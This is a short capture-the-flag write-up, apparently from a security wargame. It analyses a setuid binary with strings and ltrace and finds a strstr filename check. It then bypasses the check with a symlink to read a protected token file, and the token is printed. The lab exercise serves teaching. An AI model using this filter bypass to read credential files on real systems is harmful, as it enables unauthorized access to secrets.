## Exploring the exercice

```bash 
$ ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

We have a binary setuid/getuid and a file token.

Let's do some tests

```bash 
$ ./level08 
./level08 [file to read]

$ ./level08 token
You may not access 'token'

$./level08 .profile 
level08: Unable to open .profile: Permission denied

$ echo 'coucou' > /tmp/test.txt
$ ./level08  /tmp/test.txt
coucou
```
So we have an executable which displays the content of the file. We cannot call it on token. 
Let's see why : 

```bash 
$ strings ./level08 
[...]
token
You may not access '%s'
[...]
```

```bash 
$ ltrace ./level08 token 
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                            = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                        = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```


The strstr function is called, this function checks if the string "token" (second argument) is a substring of the input filename (first argument).


Since the program checks only the filename but not the content we can create an alias file for token using a symbolic link (ln -s). 

```bash 
$ ln -s ~/token /tmp/new
$ ./level08 /tmp/new
quif5eloekouj29ke0vouxean
```






